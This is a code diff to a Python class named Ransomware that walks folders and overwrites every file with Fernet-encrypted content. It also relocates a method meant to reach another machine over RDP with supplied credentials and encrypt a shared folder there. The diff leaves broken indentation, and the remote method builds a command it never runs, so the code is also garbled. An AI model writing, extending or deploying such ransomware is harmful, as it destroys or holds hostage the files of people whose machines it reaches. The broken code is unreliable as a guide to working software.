@@ -18,20 +18,8 @@ class Ransomware:
         if not os.path.exists("key.key"):
             write_key()
         self.key = load_key()
-
-    # Encrypt all files in a folder on a different VM using RDP (rdesktop)
-    def encrypt_folder_on_vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
-        rdp_command = f"rdesktop -u {rdp_username} -p {rdp_password} {target_vm_ip}"
-        subprocess.Popen(rdp_command, shell=True)
-
-        # Wait for RDP connection to be established
-        input("Press Enter once the RDP connection is established.")
-
-        # Encrypt files on the target VM
-        encrypt_command = f'rdesktop {target_vm_ip} -u {rdp_username} -p {rdp_password} -r "disk:Shared={folder_path}" -a 16-bit -g 1024x768 -x l'
-        self.encrypt_folder(folder_path)
-
-    def encrypt_folder(self, folder_path):
+        
+  def encrypt_folder(self, folder_path):
         for root, dirs, files in os.walk(folder_path):
             for file in files:
                 file_path = os.path.join(root, file)
@@ -45,6 +33,19 @@ class Ransomware:
                     f.write(encrypted)
 
         print("Encryption completed.")
+    # Encrypt all files in a folder on a different VM using RDP (rdesktop)
+    def encrypt_folder_on_vm(self, target_vm_ip, folder_path, rdp_username, rdp_password):
+        rdp_command = f"rdesktop -u {rdp_username} -p {rdp_password} {target_vm_ip}"
+        subprocess.Popen(rdp_command, shell=True)
+
+        # Wait for RDP connection to be established
+        input("Press Enter once the RDP connection is established.")
+
+        # Encrypt files on the target VM
+        encrypt_command = f'rdesktop {target_vm_ip} -u {rdp_username} -p {rdp_password} -r "disk:Shared={folder_path}" -a 16-bit -g 1024x768 -x l'
+        self.encrypt_folder(folder_path)
+
+  
 
     # Decrypt files using the Fernet symmetric key
     def decrypt_folder(self, folder_path):
